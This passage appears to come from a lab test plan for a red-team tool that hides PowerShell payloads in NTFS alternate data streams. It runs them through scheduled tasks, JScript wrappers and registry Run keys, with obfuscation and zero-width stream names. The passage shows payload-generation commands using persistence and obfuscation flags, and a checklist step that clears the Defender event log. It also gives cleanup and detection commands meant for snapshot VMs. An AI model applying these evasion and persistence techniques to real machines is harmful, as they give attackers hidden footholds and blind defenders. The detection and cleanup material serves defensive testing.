pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/meme002.ps1 -Persist registry -Obfuscate Basic -OutputFile /tmp/pay-note.txt
```

**VERIFY:** Deploy → sign out → sign back in → 10 Notepads appear.

---

## T-PAY-7: MEME-009 — OIIA Desktop Graffiti (SYSTEM OK)

**GENERATE:**
```bash
cat > /tmp/meme009.ps1 << 'EOF'
$msg = @"
╔════════════════════════════════════════╗
║     OIIA — RED TEAM WAS HERE          ║
║     ADS v2.4 — Execution w/o presence ║
╚════════════════════════════════════════╝
Hostname : $env:COMPUTERNAME
User     : $env:USERNAME
Time     : $(Get-Date)
"@
$paths = @(
  "$env:USERPROFILE\Desktop\OIIA_RED_TEAM_WAS_HERE.txt",
  "C:\Users\Public\Desktop\OIIA_RED_TEAM_WAS_HERE.txt",
  "$env:TEMP\OIIA_RED_TEAM_WAS_HERE.txt"
)
$paths | ForEach-Object { $msg | Out-File -FilePath $_ -Force -Encoding UTF8 -EA 0 }
EOF
pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/meme009.ps1 -Obfuscate Advanced -OutputFile /tmp/pay-oiia.txt
```

**VERIFY:** Deploy → fire task → check Desktop and `C:\Users\Public\Desktop` for `OIIA_RED_TEAM_WAS_HERE.txt`.

---

# Phase 5: Cleanup Verification

---

## T-CLN-1: Manifest-Based Cleanup

After any deployment that produced a manifest in `./manifests/`:

```bash
# On Kali: check manifest was created
ls -la manifests/
cat manifests/manifest-*.json | python3 -m json.tool
```

```powershell
# On Windows: cleanup using task name from manifest
# 1. Read manifest
$m = Get-Content "\\kali\share\manifests\manifest-*.json" | ConvertFrom-Json
# 2. Remove task
Unregister-ScheduledTask -TaskName $m.TaskName -Confirm:$false -EA 0
# 3. Remove ADS host file
Remove-Item $m.HostPath -Force -EA 0
# 4. Remove JScript wrapper
Remove-Item $m.LoaderPath -Force -EA 0
# 5. Remove registry Run key (if registry persist)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $m.TaskName -EA 0
```

---

## T-CLN-2: Zero-Width Stream Cleanup (Paranoid Tier)

For Paranoid deployments, stream name codepoints are in the manifest.

```powershell
# Reconstruct stream name from manifest codepoints
$codepoints = "U+200B U+200C"  # From manifest Codepoints field
$points = $codepoints -split '\s+' | ForEach-Object { [int]("0x" + ($_ -replace '^U\+','')) }
$sn = -join ($points | ForEach-Object { [char]$_ })

$hp = 'C:\ProgramData\Microsoft\Windows\WER\...'  # From manifest HostPath
Remove-Item "${hp}:$sn" -Force
```

---

## T-CLN-3: Quick Wipe (All ADS Artifacts)

Use only in test environments. Removes all non-Microsoft scheduled tasks, Run key entries, and ProgramData .js files.

```powershell
# Remove all non-Microsoft scheduled tasks
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' } |
  ForEach-Object { Unregister-ScheduledTask $_.TaskName -Confirm:$false -EA 0 }

# Remove .js wrappers from ProgramData
Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' -EA 0 | Remove-Item -Force

# Remove canary files from test runs
Remove-Item 'C:\Windows\Temp\ads-*.txt' -Force -EA 0
Remove-Item "$env:ProgramData\ads-*.txt" -Force -EA 0

# Check HKCU Run key — remove entries not from known-good software
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List
```

---

# Common Verification Commands

```powershell
# Find all non-Microsoft scheduled tasks
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' } |
  Format-Table TaskName, State, LastRunTime -AutoSize

# Find all ADS in ProgramData (recursive)
Get-ChildItem 'C:\ProgramData' -Recurse -File -EA 0 | ForEach-Object {
  $s = Get-Item $_.FullName -Stream * -EA 0 | Where-Object { $_.Stream -ne ':$DATA' }
  if ($s) { Write-Host "$($_.FullName)"; $s | Format-Table Stream, Length }
}

# Find JScript wrappers
Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' -EA 0 |
  Select-Object FullName, Length, LastWriteTime

# Check Registry Run keys
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -EA 0 | Format-List

# Inspect ZW chars in task name
$tn = 'TaskNameHere'
($tn.ToCharArray() | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '

# Defender detection check (last 20 events)
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 20 -EA 0 |
  Where-Object { $_.Id -in @(1116, 1117) } |
  Select-Object TimeCreated, @{n='Name';e={$_.Properties[7].Value}}, @{n='Path';e={$_.Properties[21].Value}} |
  Format-List
```

---

# VM Snapshot Workflow

1. **Before any test session:** restore to `ADS-Clean-Baseline` snapshot
2. **Verify clean state:**
   ```powershell
   Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' }
   Get-ChildItem 'C:\ProgramData' -Filter '*.js' -EA 0
   Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List
   Remove-Item 'C:\Windows\Temp\ads-*.txt' -Force -EA 0
   Remove-Item "$env:ProgramData\ads-*.txt" -Force -EA 0
   ```
3. **After passing run:** take `ADS-All-Tests-Pass-YYYY-MM-DD` snapshot

**Defender signature update:**
```powershell
Update-MpSignature; Get-MpComputerStatus | Select-Object AntispywareSignatureVersion, LastFullScanTime
```

---

# Clean VM Checklist

Before starting Phase 1+ tests:

- [ ] Snapshot restored to baseline
- [ ] No non-Microsoft scheduled tasks
- [ ] No `*.js` files in `C:\ProgramData`
- [ ] HKCU Run key clean
- [ ] No `ads-*.txt` in `C:\Windows\Temp` or `$env:ProgramData`
- [ ] Defender signatures up to date (`Update-MpSignature`)
- [ ] Real-time protection enabled (`Get-MpComputerStatus`)
- [ ] Defender operational log cleared (`Clear-EventLog -LogName "Microsoft-Windows-Windows Defender/Operational"`)

---

**Total estimated time:**
- Phase 0 (Linux pre-flight): ~5 minutes
- Phase 1 (Baseline): ~45 minutes (with snapshots)
- Phase 2 (Encryption): ~30 minutes (includes P0.5 logon gate)
- Phase 3 (Obfuscation): ~30 minutes
- Phase 4 (Payloads): ~45 minutes
- Phase 5 (Cleanup): ~15 minutes
- **Full run: ~3 hours**

For regression-only runs (after a code change), run Phase 0 + the specific test(s) affected.
